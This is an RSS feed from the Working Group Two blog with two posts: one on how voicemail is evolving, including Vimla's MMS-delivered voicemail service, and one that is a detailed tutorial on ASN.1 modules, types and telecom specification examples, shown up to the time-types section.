<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>Working Group Two Blog</title>
        <link>https://www.wgtwo.com/blog</link>
        <description>Working Group Two Blog</description>
        <lastBuildDate>Fri, 04 Feb 2022 00:00:00 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <item>
            <title><![CDATA[Don't leave your message after the beep]]></title>
            <link>https://www.wgtwo.com/blog/please-dont-leave-your-message-after-the-beep</link>
            <guid>please-dont-leave-your-message-after-the-beep</guid>
            <pubDate>Fri, 04 Feb 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it’s been a while. The common view is that voicemail isn’t popular any longer. That’s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading.]]></description>
            <content:encoded><![CDATA[<p>Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it’s been a while. The common view is that voicemail isn’t popular any longer. That’s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading. </p><p>“Please leave your message after the beep” - you’ve probably heard it a million times, especially if you were born before 1982. Or you’ve repeated that sentence over and over as you tried to make an attractive recording of your own voice as your greeting to a missed caller. We knew it wasn’t necessary to say it (people knew what to do after the beep) but we still recorded it that way. Probably because we didn’t know what else to say. </p><p>For many of us, those days are over. We just don’t bother with setting up our voicemails, we never leave voicemails and we certainly never dial up to listen to a message someone left for us. For my own part, I don’t even know if people who call me get to a voicemail system. </p><p>To others, voicemail is really crucial. </p><p>“We see the importance of voicemail increasing or declining based on specific demographics,” says Luke Campbell, the CEO of <a href="https://www.vxt.co.nz">Vxt</a>, a communications technology company in New Zealand.</p><p>Luke describes people working in transactional industries as particularly passionate about voicemail. Lawyers, real estate agents, plumbers - they might get dozens of calls every day. So where others turn off voicemail, these people might want to get their voicemails forwarded to their emails, be able to share their inbox with a colleague or assistant, have voicemails automatically translated to text and integrate their messages with productivity tools like Asana or an ERP system. Some need to have their messages stored for regulatory or security purposes. A real estate agent with (say) 10 000 contacts may want to customize the greetings so that every time one of the 200 Johns or Jessicas call, they get a personal message stating their name. To some, that might be a differentiator, to others a nuisance. </p><p>Besides, Luke tells me, how dying is voicemail really, when in New Zealand, there are two million voicemails left every day, in a population of 4,6 million? </p><h3>A vocal assistant</h3><p>Karel Bourgois paints a similar picture. He’s the CEO of <a href="https://www.voxist.com">Voxist</a>, a voicemail and messaging app, based in France. He’s seen voicemail transform into more of a productivity tool for businesses. Young people might still play around with things like customizing their voicemail greetings to individual callers, but in general, they don’t like talking. </p><p><img src="https://github.com/working-group-two/wgtwo.com/blob/main/website/static/img/blog/voicemail.jpeg" alt="Breaking up via voicemail"/> </p><p>“I see voicemail becoming more like a vocal assistant. A restaurant, for example, can let patrons reserve tables directly into the booking system just using their voices. A law firm or a bank can integrate voicemail with their CRM systems. A big movement now is to move voice messaging into core automation,” Karel says. </p><p>So voicemail systems continue to evolve. Users either don’t want voicemail or they want a voicemail service that can travel with them across devices, operators and national borders. </p><p>To Luke Campbell, the very challenge of requiring people dial into a voicemail service and listen to a bunch of commands before you get to your messages was in itself a problem big enough to be solved for kickstarting his business. Vxt started as a voice messaging service and today has evolved into a communication automation company, echoing Karel’s observations. </p><h3>The routes you can go down</h3><p>If you want to improve the voicemail experience, one route you can go down is to add more features, to make it more flexible and powerful. </p><p>Another route is to make the user experience simpler. To make it easier and faster to listen to voicemail. </p><p>That’s essentially what Working Group Two and the Swedish mobile operator challenger <a href="https://vimla.se">Vimla</a> did. In response to a regulatory challenge by the Swedish Post &amp; Telecom Authority (PTS), Vimla recently launched a voicemail service where messages get delivered to a user’s phone as an audio file (via MMS). The customer can listen to it whenever he/she wants without needing to dial into the messaging system. As a result, hackers can no longer get access to other people’s voicemails (which PTS had set out to stop) and customers get a better messaging experience. </p><p>This simple, yet elegant solution serves as a powerful example of another and more fundamental development in the telecom industry. For a few years, Working Group Two has developed and managed the mobile core network of Vimla as-a-service in the cloud, enabling Vimla to operate its network both more efficiently and taking advantage of micro innovation at scale. When this challenge came around from PTS it took Vimla only a few months to respond with this lightweight and efficient solution. Working Group Two’s developers used existing APIs to connect two otherwise separate systems (voicemail and MMS). The API-based bridge between them allowed voicemails to be sent as MMS. Today, tens of thousands messages are sent every day in the Vimla network. </p><p>“We genuinely think this is a better product for our customers,” says Viktor Georgsson, Head of Operations with Vimla. </p><p>Other operators in Sweden responded to the PTS requirements by beefing up their security systems and protecting voicemail inboxes with longer authentication codes and more rigorous encryption. Perhaps at the expense of the customer experience.</p><h3>Ask yourself four questions...</h3><p>At the end of the day, voicemail must face the test of any other digital product, says Marius Waldum, the Head of Product at Working Group Two. He’s in charge of the effort of developing the company’s ecosystem platform - where third party digital products are developed to run and meet users across multiple operators worldwide. Working Group Two has developed a standardized voicemail product called Voicebox, from which Vimla’s solution took its inspiration. </p><p>You need to ask yourself four questions, Marius points out. First, is the product <strong>valuable</strong> to its users? Is it <strong>usable</strong> for them? Is it <strong>possible to build</strong>? And is it <strong>economically viable</strong>? </p><p>“Voicemail is a powerful reminder that a product doesn’t need to be desired by everyone, but by someone,” Marius concludes.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[The specs behind the specs part 1]]></title>
            <link>https://www.wgtwo.com/blog/the-specs-behind-the-specs-part-1</link>
            <guid>the-specs-behind-the-specs-part-1</guid>
            <pubDate>Tue, 11 Jan 2022 00:00:00 GMT</pubDate>
            <description><![CDATA["Abstract Syntax Notation One (ASN.1) is a standard interface]]></description>
            <content:encoded><![CDATA[<p>&quot;Abstract Syntax Notation One (ASN.1) is a standard interface
description language for defining data structures that can be
serialized and deserialized in a cross-platform way.&quot; -
<a href="https://en.wikipedia.org/wiki/ASN.1">Wikipedia</a></p><h1>Introduction</h1><p>Today you&#x27;ll read about a specific language used to describe many of
the messages in the telecom specifications. It will be a deep-dive
into technical parts, so I imagine you could just use the blog post
when you want to look up different parts without fully reading it.</p><p>In <strong>wgtwo</strong> we use this language for some specific telco
messages (such as SIGTRAN layers TCAP/MAP/CAP, as well as S1AP, NGAP
and probably some more). They are defined directly in some of the
telecom specifications, and because of that it is possible to use them
to send messages between different telecom cores.</p><p>This will <em>probably</em> be a two piece blog post as there is another
interface describing language which is not ASN.1, and this is already
a very long post. The other specification is used in Diameter
dictionaries, but I&#x27;ll spare those for now. It has already taken me
about half a year to finish up this article.</p><p>There might be some Erlang specific paragraphs here and there, but
this blog post is mainly about ASN.1 as a specification, which can be
used in any language supporting it.  For Erlang specifics I came
across <a href="https://medium.com/erlang-battleground/erlang-asn-1-abstract-syntax-notation-one-deeb8300f479">this blog
post</a>
written by Viacheslav Katsuba, and because it is build into Erlang by
default I recommend the
<a href="https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html">APIs</a>
as well.</p><p><strong>DISCLAIMER: SEVERE HEADACHE MIGHT FOLLOW.</strong></p><h1>Abstract Syntax Notation One</h1><p>Abstract Syntax Notation One (ASN.1 for short) provides a
high level description of messages. It abstracts the language
implementations from the protocol design.</p><p>It was initially used by <a href="https://en.wikipedia.org/wiki/Open_Systems_Interconnection">Open Systems Interconnection
(OSI)</a> to
describe email messages but is used by many other applications
especially within telecommunications and cryptography.</p><p>You might have heard of similar such abstract syntax notations used
for interface definitions such as Google Protocol Buffers, or
Facebook&#x27;s Apache Thrift, but those languages have not been managed by
a standardization organization, so the owning corporations could (in
theory) make breaking changes or change the license or even remove the
language definitions overnight.</p><p>Anyway, back to ASN.1</p><p>The first ASN.1 standardization came out 1984, and there have been
many improvements since, for instance with the 1994 update which added
extended functionality for telecommunication technologies.</p><p>&quot;Long live ASN.1!&quot; - Olivier Dubuisson from the <a href="https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html#dubuisson">best
book</a>
that I&#x27;ve read on the subject. (How many ASN.1 books are there you
might wonder? Actually there were <a href="https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html">more
books</a>
than I expected on the subject, but to make it perfectly clear: I did
only read the one.)</p><p>Off-topic but a bit of a fun fact I got from reading the book which I
didn&#x27;t know about before is that &#x27;little Endian&#x27; and &#x27;big Endian&#x27;,
which are used to denote if the bitstring should be read from leftmost
or rightmost bit, actually originates from the 1726 best-seller
<a href="https://www.ling.upenn.edu/courses/Spring_2003/ling538/Lecnotes/ADfn1.htm">Gulliver&#x27;s
travels</a>.</p><h2>The how and why</h2><p>ASN.1 builds on the following ideas:</p><ul><li>Data structures to be transmitted should be described regardless of
programming language used transmitting or receiving them.</li><li>The notation should allow building complex data types from basic
types, and be able to do so recursively.</li><li>The notation must be formal to prevent ambiguities.</li></ul><p>That said, ASN.1 is not an abstract syntax in itself, but a language
to describe abstract syntaxes.</p><p>There are currently four main ASN.1 specifications (listed below), as
well as at least one specification per encoding rule (listed in the
<a href="#encodings">last section</a>).</p><table><thead><tr><th>ITU-T no</th><th>ASN.1 specifications</th></tr></thead><tbody><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.680">X.680</a></td><td>Abstract Syntax Notation One (ASN.1): Specification of basic notation</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.681">X.681</a></td><td>Abstract Syntax Notation One (ASN.1): Information object specification</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.682">X.682</a></td><td>Abstract Syntax Notation One (ASN.1): Constraint specification</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.683">X.683</a></td><td>Abstract Syntax Notation One (ASN.1): Parameterization of ASN.1 specifications</td></tr></tbody></table><h1>Nitty gritty</h1><h2>Modules</h2><p>The purpose of an ASN.1 module is to name a collection of types and/or
value definitions.</p><p>It consist of a module reference and an optional object identifier
together with the declaration of the <code>DEFINITIONS</code> type definition.
Note that even though the object identifier is optional, it is
considered bad practice to leave it out. The reason for it being
optional is for backward compatibility; it was not part of the
original ASN.1 specification.
The <code>DEFINITIONS</code> keyword usually comes together with the <code>BEGIN</code> and
<code>END</code> keywords so multiple definitions can be done. (What else is the
point of a module if not to make a collection...).</p><p>The Erlang ASN.1 compiler requires each module to be in a separate
file, but generally one ASN.1 file could contain many modules.  Usual
file endings are <code>.asn</code> and <code>.asn1</code>. One
<a href="https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html#multi-file-compilation">trick</a>
that can be used to circumvent this Erlang specific problem is to list
multiple ASN.1 files in a new file ending with <code>set.asn</code>.</p><p>One example of a file with many modules exist in the CAP specification
<a href="https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=1597">3GPP TS 29.078</a></p><p>The ASN.1 template for a module</p><pre><code class="language-asn.1">ModuleReference ObjectIdentifier
DEFINITIONS ::= BEGIN

END
</code></pre><p>as seen in an example</p><pre><code class="language-asn.1">CAP-operationcodes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) 
modules(3) cap-operationcodes(53) version8(7)}

DEFINITIONS ::= BEGIN
</code></pre><p>For information about the object identifier see the <a href="#object-identifier">types section</a></p><h3>Importing from other modules</h3><p>Importing types, values and other structures from other modules can be
done with the <code>IMPORTS</code> and <code>FROM</code> keywords in the beginning of the
module body.  The <code>IMPORTS</code> keyword ends with a single semicolon <code>;</code>,
and the different imported definitions are comma-separated.</p><p>The meaning of the optional <code>IMPLICIT TAGS</code> keywords I&#x27;ll handle
<a href="#automatic-implicit-explicit-tags">later</a>.</p><pre><code class="language-asn.1">CAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}
DEFINITIONS IMPLICIT TAGS ::= BEGIN

IMPORTS

    Duration,
    Integer4,
    Interval,
    LegID,
    ServiceKey
FROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)
modules(0) cs1-datatypes(2) version1(0)}

    BothwayThroughConnectionInd,
    CriticalityType,
    MiscCallInfo
FROM CS2-datatypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)
cs2(20) modules(0) in-cs2-datatypes(0) version1(0)}

-- ...more imports...
; -- IMPORTS end here

END -- CAP-datatypes ends here --

-- CAP-errortypes module starts here --
CAP-errortypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-errortypes(51) version8(7)}
DEFINITIONS IMPLICIT TAGS ::= BEGIN


END -- CAP-errortypes ends here --
</code></pre><p>The type definitions <code>Duration</code> and <code>LegID</code> above are imported from
<code>CS1-DataTypes</code> module, while <code>MiscCallInfo</code> comes from
the <code>CS2-datatypes</code> module.</p><h3>Exporting from a module</h3><p>Exports from a module are done in a similar fashion.</p><p>If the <code>EXPORT</code> keyword is not used in a module, the ASN.1 compilers
should export all values and types from the module. It&#x27;s the same as
specifying <code>EXPORTS ALL;</code>.</p><pre><code class="language-asn.1">CAP-GPRS-ReferenceNumber {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)
umts-network(1) modules(3) cap-dialogueInformation(111) version8(7)}

DEFINITIONS ::= BEGIN

EXPORTS
    id-CAP-GPRS-ReferenceNumber,
    cAP-GPRS-ReferenceNumber-Abstract-Syntax;

IMPORTS

    Integer4
FROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)
modules(0) cs1-datatypes(2) version1(0)}
;

END
</code></pre><h3>Commenting</h3><p>As can be seen in the above example one can enter comments into the
ASN.1.  Comments starts with double dash <code>--</code> and ends with either a
newline or another <code>--</code>, whichever comes first.</p><h2>Assignments and naming</h2><p>The rules specify that type references must start with an uppercase
letter and may not end with a dash <code>-</code>. It may also only contain
upper- and lower-case letters, digits or dashes <code>-</code>.  The syntax for a
type assignment is</p><pre><code class="language-asn.1">TypeRef ::= TypeDefinition
</code></pre><p>For instance</p><pre><code class="language-asn.1">InvokeIdType ::= INTEGER (-128..127)

CancelArg ::= CHOICE {
    invokeID        [0] InvokeID,
    allRequests     [1] NULL
}

Duration ::= INTEGER (-2..86400)

Integer4 ::= INTEGER (0..2147483647)

Interval ::= INTEGER (-1..60000)

InvokeID ::= InvokeIdType

LegID ::= CHOICE {
    sendingSideID   [0] LegType,
    -- used in operations sent from SCF to SSF
    receivingSideID [1] LegType
    -- used in operations sent from SSF to SCF
}

LegType ::= OCTET STRING (SIZE(1))

ServiceKey ::= Integer4
</code></pre><p>Value references have a similar syntax as type references except that
value references must start with a lower-case letter, and also carry
the values type.</p><p>Syntax</p><pre><code class="language-asn.1">valueRef Type ::= value
</code></pre><p>For example</p><pre><code class="language-asn.1">leg1 LegType ::= &#x27;01&#x27;H
leg2 LegType ::= &#x27;02&#x27;H

highLayerCompatibilityLength            INTEGER ::= 2
minAChBillingChargingLength             INTEGER ::= 0
</code></pre><h1>Types</h1><p>Now when we have talked a bit about naming references, and how to
assign values and types I&#x27;ll go over which built-in types exist, and
how to create new types.</p><p>There are some common types, each consists of a type reference and a
tag number.  The tag number is used to identify it when sending the
type in the network.  The universal tags are specified in <a href="https://www.itu.int/rec/T-REC-X.680/en">ITU-T
X.680</a></p><p>Here is a list of the most common types</p><table><thead><tr><th>Type</th><th>Universal Tag Number</th></tr></thead><tbody><tr><td><a href="#boolean">BOOLEAN</a></td><td>1</td></tr><tr><td><a href="#integer">INTEGER</a></td><td>2</td></tr><tr><td><a href="#bit-string">BIT STRING</a></td><td>3</td></tr><tr><td><a href="#octet-string">OCTET STRING</a></td><td>4</td></tr><tr><td><a href="#null">NULL</a></td><td>5</td></tr><tr><td><a href="#object-identifier">OBJECT IDENTIFIER</a></td><td>6</td></tr><tr><td><a href="#external">EXTERNAL</a></td><td>8</td></tr><tr><td><a href="#real">REAL</a></td><td>9</td></tr><tr><td><a href="#enumerated">ENUMERATED</a></td><td>10</td></tr><tr><td><a href="#string-types">UTF8String</a></td><td>12</td></tr><tr><td><a href="#time-types">TIME</a></td><td>14</td></tr><tr><td><a href="#sequence-of">SEQUENCE (OF)</a></td><td>16</td></tr><tr><td><a href="#set-of">SET (OF)</a></td><td>17</td></tr><tr><td><a href="#string-types">NumericString</a></td><td>18</td></tr><tr><td><a href="#string-types">IA5String</a></td><td>22</td></tr><tr><td><a href="#time-types">UTCTime</a></td><td>23</td></tr><tr><td><a href="#time-types">GeneralizedTime</a></td><td>24</td></tr><tr><td><a href="#string-types">VisibleString</a></td><td>26</td></tr><tr><td><a href="#time-types">DATE</a></td><td>31</td></tr><tr><td><a href="#time-types">TIME-OF-DAY</a></td><td>32</td></tr><tr><td><a href="#time-types">DATE-TIME</a></td><td>33</td></tr><tr><td><a href="#time-types">DURATION</a></td><td>34</td></tr><tr><td></td><td></td></tr><tr><td><a href="#choice">CHOICE</a></td><td>*</td></tr><tr><td><a href="#selection">SELECTION</a></td><td>*</td></tr></tbody></table><p>The common types can be divided into simple and structured types.
Structured types are the composition of multiple types (so called
component types) using one of the following types and keywords
<code>SEQUENCE</code>, <code>SEQUENCE OF</code>, <code>SET</code>, <code>SET OF</code>, <code>CHOICE</code>, and/or
<code>SELECTION</code>.  Note that <code>CHOICE</code> and <code>SELECTION</code> does not <!-- -->[need to]<!-- -->
have their own universal tags, due to those are consisting of other
types.</p><h2>Basic types</h2><h3>BOOLEAN</h3><p>The <code>BOOLEAN</code> type takes values <code>TRUE</code> or <code>FALSE</code>.</p><pre><code class="language-asn.1">AudibleIndicator ::= CHOICE {
    tone       BOOLEAN,
    burstList  [1] BurstList
}

</code></pre><p>Here the value <code>tone</code> of the composit type <code>AudibleIndicator</code> is of
type <code>BOOLEAN</code>. Note: It was one of the cleanest example I could find
of a <code>BOOLEAN</code> in the ASN.1 files we use, because Telco often use a
special &quot;trick&quot; when it comes to booleans in order to save bandwidth,
i.e. the <code>NULL</code> type.</p><h3>NULL</h3><p>The <code>NULL</code> type is basically a placeholder, where the recognition of a
value is important but the actual value is not.</p><p>In 3GPP it is similar to <code>BOOLEAN</code> in the sense that a defined <code>NULL</code>
value is considered <code>TRUE</code> and if the value is missing it is
considered <code>FALSE</code>. The reason for this is that when sent over the
network with <a href="#encodings">BER encoding</a>, it will take no space because
<code>BOOLEAN</code> is always of length 1 but <code>NULL</code> is always length 0,
i.e. <code>NULL</code> does not contain a value.</p><pre><code class="language-asn.1">CancelArg {PARAMETERS-BOUND : bound} ::= CHOICE {
    invokeID            [0] InvokeID,
    allRequests         [1] NULL,
    callSegmentToCancel [2] CallSegmentToCancel {bound}
}
</code></pre><p>in this example <code>allRequests</code> can be defined (then only the tag is
transmitted) or not at all.</p><h3>INTEGER</h3><p><code>INTEGER</code> takes any of the infinite set of integer values. It can also
have the additional notation that names some of the values.</p><pre><code class="language-asn.1">GSMMAPOperationLocalvalue ::= INTEGER{
    updateLocation (2),
    cancelLocation (3),
    provideRoamingNumber (4),
    noteSubscriberDataModified (5),
    resumeCallHandling (6),
    insertSubscriberData (7),
    -- rest of the named integers --
}
</code></pre><pre><code class="language-asn.1">localvalue1 GSMMAPOperationLocalvalue ::= updateLocation
localvalue2 GSMMAPOperationLocalvalue ::= 2
localvalue3 GSMMAPOperationLocalvalue ::= -55413459
</code></pre><p>are all valid <code>GSMMAPOperationLocalvalue</code>s.</p><h3>ENUMERATED</h3><p><code>ENUMERATED</code> has the same interpretation as <code>INTEGER</code> but will hold
specific values only.</p><pre><code class="language-asn.1">RequestedInformationType ::= ENUMERATED {
    callAttemptElapsedTime(0),
    callStopTime(1),
    callConnectedElapsedTime(2),
    calledAddress(3),
    releaseCause(30)
}
</code></pre><pre><code class="language-asn.1">reqInfoType1 RequestedInformationType ::= callAttemptElapsedTime
reqInfoType2 RequestedInformationType ::= 0
</code></pre><p>are both valid values of <code>RequestInformationType</code>, while this is not:</p><pre><code class="language-asn.1">notValidReqInfoType RequestedInformationType ::= 4
</code></pre><h3>BIT STRING</h3><p><code>BIT STRING</code> takes values that are a sequence of zero or more bits. It
can also take an additional notation that name certain bits in the bit
sequence.</p><pre><code class="language-asn.1">DeferredLocationEventType ::= BIT STRING {
    msAvailable (0) ,
    enteringIntoArea (1),
    leavingFromArea (2),
    beingInsideArea (3) ,
    periodicLDR (4)
} (SIZE (1..16))
</code></pre><pre><code class="language-asn.1">eventType1 DeferredLocationEventType ::= (msAvailable, beingInsideArea)
eventType2 DeferredLocationEventType ::= &#x27;10010&#x27;B
eventType3 DeferredLocationEventType ::= &#x27;12&#x27;H
</code></pre><p>are all valid value definitions of the same bit sequence where the
first and third bits are set, and no other bits are set.  The <code>B</code> stands
for binary representation and <code>H</code> for hexadecimal representation.</p><p>The <code>SIZE</code> is a constraint on the type defining it to be of a specific
length. This keyword comes as an extra notation for many of the
<code>STRING</code> types below (as well as some of the other types).</p><h3>OCTET STRING</h3><p>Type <code>OCTET STRING</code> takes values that are an ordered sequence of zero
or more (eight-bit) octets.</p><pre><code class="language-asn.1">MM-Code ::= OCTET STRING (SIZE (1))
</code></pre><p>In the same manner as <code>BIT STRING</code> both values below are valid
instances of <code>MM-Code</code>:</p><pre><code class="language-asn.1">iMSI-Attach1 MM-Code ::= &#x27;00000010&#x27;B
iMSI-Attach2 MM-Code ::= &#x27;02&#x27;H
</code></pre><p>while</p><pre><code class="language-asn.1">notValidIMSI-Attach MM-Code ::= &#x27;10010&#x27;B
</code></pre><p>is not considered a valid value due to it not being a multiple of eight bits.</p><h3>OBJECT IDENTIFIER</h3><p>The <code>OBJECT IDENTIFIER</code> type (shortened <code>OID</code>) names information
objects such as ASN.1 modules. The named information object is a node
on an object identifier tree that is managed at the international
level.</p><p>ETSI for instance is managed by ITU-T
<code>itu-t(0) identified-organization(4) etsi(0)</code></p><div><img src="/img/blog/the-specs-behind-the-specs/etsi_asn1oidtree.gif" alt="ETSI OID tree"/></div><p>and as can see in the <code>Modules</code> example version 8 of cap-datatypes is part of ETSI.
<code>CAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}</code></p><p>Other root arcs</p><table><thead><tr><th>Root</th><th>Organization</th></tr></thead><tbody><tr><td>0</td><td>ITU-T</td></tr><tr><td>1</td><td>ISO</td></tr><tr><td>2</td><td>joint-iso-itu-t</td></tr></tbody></table><p>The labels are optional and the reference could also be written as <code>{0
4 0 0 1 3 52 7}</code>. Only positive integers are allowed including zero (0).</p><p>Another example comes from the CAP-object-identifiers module in ETSI 129.078.</p><pre><code class="language-asn.1">tc-Messages OBJECT IDENTIFIER ::=
    {itu-t recommendation q 773 modules(2) messages(1) version3(3)}

id-CAP OBJECT IDENTIFIER ::=
    {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)
     umts-network(1) cap4(22)}

id-ac OBJECT IDENTIFIER ::= {id-CAP ac(3)}
</code></pre><p><code>id-ac</code> is a child of the <code>id-CAP</code> object identifier.</p><p>One could lookup object identifiers by visiting this amazing
<a href="https://oidref.com/">page (oidref.com)</a>.</p><h3>EXTERNAL</h3><p><code>EXTERNAL</code> represents a value that does not need to be specified as a
ASN.1 type. It carries information on how the data should be interpreted.</p><p>{% raw %}```asn.1
Unidirectional {OPERATION:Invokable, OPERATION:Returnable} ::= SEQUENCE {
dialoguePortion  DialoguePortion OPTIONAL,
components       ComponentPortion{{Invokable}, {Returnable}}
}</p><p>DialoguePortion ::= <!-- -->[APPLICATION 11]<!-- --> EXPLICIT EXTERNAL</p><pre><code class="language-{%" metastring="endraw %}">
Here the value `dialoguePortion` will have tag 11 if specified, it is
then up to the application to decide how to deal with the value.

### REAL

Values of the type `REAL` will take a triplet of numbers (m, b, e),
where m is the mantissa (a signed number), b the base (2 or 10), and e
the exponent (a signed number).

There are also three special values it can take `PLUS-INFINITY`, 0,
and `MINUS-INFINITY`.

```asn.1
theBestRealValue REAL ::= (123, 10, -2) -- 1.23
maxValue REAL ::= PLUS-INFINITY
</code></pre><h3>String types</h3><p>I feel like most of the string types are the same, except that they
all take diffrent character sets. I&#x27;ve already described <code>BIT STRING</code>
and <code>OCTET STRING</code> which both operate the bit set, but there is a
lot of others that operate over character sets.</p><table><thead><tr><th>Type</th><th>Tag</th><th>Character set regex/comment</th></tr></thead><tbody><tr><td>UTF8String</td><td>12</td><td>Synonymous with UniversalString at abstract level</td></tr><tr><td>NumericString</td><td>18</td><td><code>[0-9 ]</code></td></tr><tr><td>PrintableString</td><td>19</td><td><code>[A-Za-z0-9&#x27;()+,./:=? -]</code></td></tr><tr><td>TelexString (T61String)</td><td>20</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf">ISOReg</a> reg. #6, #87, #102, #103, #106, #107, #126, #144, #150, #153, #156, #164, #165, #168 + space,delete</td></tr><tr><td>VideotexString</td><td>21</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf">ISOReg</a> reg. #1, #13, #72, #73, #87, #89, #102, #108, #126, #128, #129, #144, #150, #153, #164, #165, #168 + space,delete</td></tr><tr><td>IA5String</td><td>22</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf">ISOReg</a> reg. #1, #6 + space,delete</td></tr><tr><td>GraphicString</td><td>25</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf">ISOReg</a> graphical sets (called &#x27;G&#x27;) + space</td></tr><tr><td>VisibleString (ISO646String)</td><td>26</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf">ISOReg</a> reg. #6 + space</td></tr><tr><td>GeneralString</td><td>27</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf">ISOReg</a> graphical sets (called &#x27;G&#x27;), control characters (called &#x27;C&#x27;) + space,delete</td></tr><tr><td>UniversalString</td><td>28</td><td>[ISO10646-1]</td></tr><tr><td>BMPString</td><td>30</td><td>Basic Multilingual Plane; subtype of UniversalString</td></tr></tbody></table><p><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf">ISOReg</a>
is a pretty good source, it reference most of the registers but not
all of them as far as I can see.</p><p>I&#x27;ll list some examples of string types found in our ASN.1 files:</p><pre><code class="language-asn.1">AMFNameUTF8String ::= UTF8String (SIZE(1..150, ...))

DirectoryString ::= CHOICE {
    teletexString TeletexString (SIZE (1..maxSize)),
    printableString PrintableString (SIZE (1..maxSize)),
    universalString UniversalString (SIZE (1..maxSize)),
    bmpString BMPString (SIZE (1..maxSize))
--    utf8String UTF8String (SIZE (1..maxSize))
    }

DisplayInformation ::= IA5String (SIZE (minDisplayInformationLength..maxDisplayInformationLength))
</code></pre><p><code>IA5String</code> is used to represent ISO 646 (IA5; International Alphabet 5)
characters.  The entire character set contains precisely 128
characters and are generally equivalent to the first 128 characters of
the ASCII alphabet.</p><p>There are multiple formats for the values of <code>UniversalString</code>, <code>BMPString</code> and
<code>UTF8String</code> types. One could either specify a quadruple with <code>{group,
plane, row, cell}</code> for the character needed, or an array of defined values (strings).</p><p>An example from Dubuisson:</p><pre><code class="language-asn.1">latinCapitalLetterA UniversalString ::= {0,0,0,65}
greekCapitalLetterSigma UniversalString ::= {0,0,3,145}

my-string UniversalString ::= {
    &quot;This is a capital A: &quot;, latinCapitalLetterA,
    &quot;, and a capital alpha: &quot;, greekCapitalLetterAlpha,
    &quot;; try and spot the difference!&quot;}
</code></pre><p>And X.680 gives us yet another example</p><pre><code class="language-asn.1">IMPORTS
  BasicLatin, greekCapitalLetterSigma
  FROM ASN1-CHARACTER-MODULE
    { joint-iso-itu-t asn1(1) specification(0) modules(0) iso10646(0) };

 MyAlphabet ::= UniversalString (FROM (BasicLatin | greekCapitalLetterSigma))

 mystring MyAlphabet ::= { &quot;abc&quot; , greekCapitalLetterSigma , &quot;def&quot; }
</code></pre><h3>Time types</h3><p>The <code>UTCTime</code> and <code>GeneralizedTime</code> types are actually specified as
<code>VisibleString</code>.</p><p><code>UTCTime</code> format is &quot;YYMMDD&quot; for date followed by &quot;hhmm&quot; or &quot;hhmmss&quot;
for time, ending with either &quot;z&quot;, &quot;-hhmm&quot; or &quot;+hhmm&quot; for time offset.</p><p>Specifying &quot;2021-12-14 04:32 CET&quot; in <code>UTCTime</code></p><pre><code class="language-asn.1">&quot;2112140332Z&quot;
&quot;2112140432+0100&quot;
</code></pre><p><code>GeneralizedTime</code> gives a bit more flexibility with regards to the format.</p><p>It consists of a calendar date of format &quot;YYYYMMDD&quot;, followed by
either &quot;hh&quot;, &quot;hhmm&quot;, &quot;hhmmss&quot; and optional parts &quot;.<!-- -->[0-9]<!-- -->+&quot;, and
optionally ending with the coordinated universal time character &quot;z&quot; or
the time offset in hours/minutes &quot;-hhmm&quot; or &quot;+hhmm&quot;.</p><p>These are the same, but one with higher precision and in local time.</p><pre><code class="language-asn.1">&quot;2021121403.54Z&quot; -- 3.54 hours after midnight
&quot;20211214043227.981935+0100&quot; -- 3 hours, 32 minutes, 27 seconds, 981935 microseconds
</code></pre><p><code>DATE</code>, <code>TIME-OF-DAY</code>, <code>DATE-TIME</code> and <code>DURATION</code> was introduced after
the third generation of ISO 8601 was released 2004.</p><p>They are defined as subsets of <code>TIME</code>.</p><pre><code class="language-asn.1">DATE ::= [UNIVERSAL 31] IMPLICIT TIME
       (SETTINGS &quot;Basic=Date Date=YMD Year=Basic&quot;)
TIME-OF-DAY ::= [UNIVERSAL 32] IMPLICIT TIME
